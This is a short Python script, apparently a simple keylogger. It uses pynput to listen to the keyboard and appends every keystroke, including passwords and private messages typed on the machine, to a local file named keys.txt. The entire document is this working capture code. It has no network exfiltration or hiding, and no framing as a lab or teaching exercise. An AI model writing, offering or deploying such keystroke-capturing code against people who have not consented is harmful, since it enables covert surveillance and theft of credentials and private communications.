from pynput import keyboard
from pynput.keyboard import Key

def on_press(key):

    with open("keys.txt" , 'a') as file:
        if key == Key.enter:
            file.write("\n")
        else:
            if key == Key.space:
                file.write(" ")
            else:
                k = str(key).replace("'" , "")
                file.write(k)


with keyboard.Listener(on_press = on_press) as listener:
    listener.join()